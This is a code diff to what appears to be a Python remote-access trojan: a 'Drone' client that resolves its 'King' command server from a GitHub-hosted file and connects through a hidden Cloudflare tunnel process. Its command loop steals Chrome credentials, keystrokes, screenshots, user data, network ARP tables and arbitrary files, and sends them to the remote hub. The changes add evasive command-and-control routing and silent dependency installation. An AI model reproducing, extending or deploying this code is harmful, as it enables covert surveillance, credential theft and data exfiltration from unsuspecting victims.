@@ -18,7 +18,7 @@ import uuid
 import winreg
 
 def install_dependencies():
-    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow']
+    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
     for lib in required:
         try:
             __import__(lib if lib != 'pycryptodome' else 'Crypto')
@@ -26,6 +26,8 @@ def install_dependencies():
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
 
 install_dependencies()
+
+import websocket
 
 try:
     import requests
@@ -143,13 +145,16 @@ def get_arp_table():
         return f'Failed to get ARP table: {e}'
 
 
-def send_atomic_data(s, type, data, filename):
+def send_atomic_data(s, type, data, filename, is_websocket=False):
     """Send data with the unified atomic sync protocol."""
     try:
         if isinstance(data, str):
             data = data.encode('utf-8')
         header = f"DATA_HEADER|{type}|{len(data)}|{filename}\n".encode('utf-8')
-        s.sendall(header + data + b'V_PULSE_EOF')
+        if is_websocket:
+            s.send_binary(header + data + b'V_PULSE_EOF')
+        else:
+            s.sendall(header + data + b'V_PULSE_EOF')
         return True
     except Exception as e:
         print(f'[-] Atomic send failed: {e}')
@@ -253,11 +258,14 @@ def stop_clipboard_monitor():
 
 # Screenshot
 
-def capture_desktop_screenshot(client):
+def capture_desktop_screenshot(client, is_websocket=False):
     """Capture the desktop and send it back."""
     if not MSS_AVAILABLE or not PIL_AVAILABLE:
         try:
-            client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
+            if is_websocket:
+                client.send('DEPENDENCY_MISSING: mss Pillow')
+            else:
+                client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
         except Exception:
             pass
         return
@@ -274,10 +282,13 @@ def capture_desktop_screenshot(client):
             buffer = io.BytesIO()
             image.save(buffer, format='JPEG', quality=60, optimize=True)
             jpg_data = buffer.getvalue()
-            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg')
+            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg', is_websocket=is_websocket)
     except Exception as e:
         try:
-            client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
+            if is_websocket:
+                client.send(f'CAPTURE_FAILED: {e}')
+            else:
+                client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
         except Exception:
             pass
 
@@ -714,30 +725,117 @@ def extract_file_bytes(path):
         return None
 
 
-def get_king_ip(raw_url: str = DEFAULT_GITHUB_THRONE_URL, retry_delay: int = 10) -> str:
-    """Retrieve the King host IP from a GitHub raw file, retrying until available."""
-    if not REQUESTS_AVAILABLE:
-        raise RuntimeError('The requests library is not available.')
+def get_king_domain(url=DEFAULT_GITHUB_THRONE_URL):
+    """Fetch the Cloudflare domain from GitHub throne.txt."""
+    try:
+        response = requests.get(url, timeout=10)
+        return response.text.strip()
+    except Exception as e:
+        print(f"[-] Failed to fetch king domain: {e}")
+        return None
 
-    while True:
+
+def establish_connection(url=DEFAULT_GITHUB_THRONE_URL):
+    """Establish Cloudflare bridge connection to the King."""
+    king_domain = get_king_domain(url)
+    if not king_domain:
+        print("[-] Could not retrieve King domain.")
+        return None
+    
+    print(f"[*] King found at: {king_domain}")
+
+    # 1. Start a local bridge on the Drone's side
+    # This maps the Cloudflare tunnel to the Drone's local port 1234
+    
+    # Robustly find the cloudflared executable using absolute path
+    cloudflared_path = os.path.join(os.getcwd(), "cloudflared.exe")
+    if not os.path.exists(cloudflared_path):
+        # Try alternative name
+        alt_path = os.path.join(os.getcwd(), "cloudflared.exe.exe")
+        if os.path.exists(alt_path):
+            cloudflared_path = alt_path
+        else:
+            print(f"[-] cloudflared.exe not found in {os.getcwd()}")
+            return None
+
+    bridge_cmd = [
+        cloudflared_path, "access", "tcp", 
+        "--hostname", king_domain, 
+        "--listener", "127.0.0.1:1234"
+    ]
+    
+    try:
+        # Run the bridge in the background with properly hidden stdout/stderr
+        subprocess.Popen(
+            bridge_cmd, 
+            stdout=subprocess.DEVNULL, 
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
+        )
+        time.sleep(2)  # Give it a second to stabilize
+    except FileNotFoundError:
+        print("[-] cloudflared.exe not found. Make sure Cloudflare Tunnel is installed.")
+        return None
+    except Exception as e:
+        print(f"[-] Failed to start bridge: {e}")
+        return None
+
+    # 2. Connect the Socket to the local bridge
+    max_retries = 3
+    for attempt in range(max_retries):
         try:
-            response = requests.get(raw_url, timeout=10)
-            if response.status_code == 200:
-                return response.text.strip()
-        except Exception:
-            pass
-        time.sleep(retry_delay)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10.0)
+            s.connect(("127.0.0.1", 1234))
+            print("[+] Evolution Link Established via Cloudflare.")
+            return s
+        except ConnectionError as e:
+            print(f"[-] Connection attempt {attempt+1} failed: {e}")
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            print(f"[-] Connection Failed after {max_retries} attempts: {e}")
+            return None
+        except Exception as e:
+            print(f"[-] Connection Failed: {e}")
+            return None
 
 
-def connect_to_hub(hub_ip, port):
+def connect_direct_hub(hub_ip, port, max_retries: int = 3):
+    """Connect directly to the command hub using a raw TCP socket."""
+    for attempt in range(max_retries):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10.0)
+            s.connect((hub_ip, port))
+            print(f"[+] Direct connection established to hub at {hub_ip}:{port}")
+            return s
+        except (ConnectionRefusedError, ConnectionResetError, socket.timeout, OSError) as e:
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            print(f"[-] Direct connection failed after {max_retries} attempts: {e}")
+            return None
+        except Exception as e:
+            print(f"[-] Direct connection error: {e}")
+            return None
+
+
+def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
     """Connect to the hub and process commands."""
     while True:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.settimeout(10.0)
         try:
-            print(f'[*] Attempting to reach King at {hub_ip}:{port}...')
-            client.connect((hub_ip, port))
-            print('[*] Connected to King.')
+            if github_throne_url:
+                client = establish_connection(github_throne_url)
+            else:
+                client = connect_direct_hub(hub_ip, port)
+
+            if not client:
+                delay = random.randint(5, 15)
+                print(f'[*] Retrying in {delay} seconds...')
+                time.sleep(delay)
+                continue
+            
             while True:
                 try:
                     data = client.recv(4096).decode('utf-8', errors='ignore')
@@ -745,6 +843,9 @@ def connect_to_hub(hub_ip, port):
                     continue
                 except ConnectionResetError:
                     print('[-] Connection reset by hub.')
+                    break
+                except Exception as e:
+                    print(f'[-] Socket error: {e}')
                     break
 
                 if not data:
@@ -760,7 +861,7 @@ def connect_to_hub(hub_ip, port):
                         client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
                         client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
-                        capture_desktop_screenshot(client)
+                        capture_desktop_screenshot(client, is_websocket=False)
                     elif command == 'SCREENSHOT':
                         try:
                             from mss import mss
@@ -861,25 +962,25 @@ def connect_to_hub(hub_ip, port):
                             pass
                         return
                     elif command == 'EXPLORE_DRIVES':
-                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json')
+                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                     elif command == 'HARVEST_USER':
-                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json')
+                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=False)
                     elif command == 'NETWORK_TOPOLOGY':
-                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt')
+                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=False)
                     elif command == 'EXTRACT_CREDENTIALS':
-                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
+                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
                         else:
-                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt')
+                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
                     elif command.startswith('EXTRACT_FILE '):
                         file_path = command[13:].strip('"')
                         payload = extract_file_bytes(file_path)
                         if payload is None:
-                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt')
+                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=False)
                         else:
-                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path))
+                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
                     elif command.startswith('KEYLOG'):
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
@@ -920,18 +1021,19 @@ def connect_to_hub(hub_ip, port):
                                 pass
                     else:
                         pass
-        except ConnectionResetError:
-            print('[-] Connection reset while listening to hub.')
-        except socket.error as e:
-            print(f'[-] Socket error: {e}')
+        except websocket.WebSocketConnectionClosedException:
+            print('[-] WebSocket connection closed while listening to hub.')
+        except websocket.WebSocketException as e:
+            print(f'[-] WebSocket error: {e}')
+        except requests.RequestException as e:
+            print(f'[-] Failed to fetch King URL from GitHub: {e}')
         except Exception as exc:
             print(f'[-] Unexpected error: {exc}')
         finally:
             try:
-                client.shutdown(socket.SHUT_RDWR)
+                client.close()
             except Exception:
                 pass
-            client.close()
 
         delay = random.randint(5, 15)
         print(f'[*] Retrying in {delay} seconds...')
@@ -974,18 +1076,9 @@ if __name__ == '__main__':
     print(f'MSS:       {"available" if MSS_AVAILABLE else "missing"}')
     print(f'PIL:       {"available" if PIL_AVAILABLE else "missing"}')
     print('============================================================\n')
-    if args.hub_ip == HUB_ADDRESS:
-        print(f'[*] WARNING: Using default HUB_IP {HUB_ADDRESS}. Update --hub-ip if King is on a different machine.')
     if args.github_throne_url:
-        try:
-            king_ip = get_king_ip(args.github_throne_url)
-            print(f'[*] Resolved King IP from GitHub throne: {king_ip}')
-            args.hub_ip = king_ip
-        except Exception as exc:
-            print(f'[-] Could not resolve King IP from GitHub throne: {exc}')
-            print('[*] Falling back to configured hub IP')
+        print(f'[*] Using GitHub throne to resolve King domain: {args.github_throne_url}')
+    else:
+        print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
 
-    if args.hub_port == HUB_PORT:
-        print(f'[*] WARNING: Using default HUB_PORT {HUB_PORT}. Update --hub-port if King is on a different machine.')
-    print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
-    connect_to_hub(args.hub_ip, args.hub_port)
+    connect_to_hub(args.hub_ip, args.hub_port, args.github_throne_url)
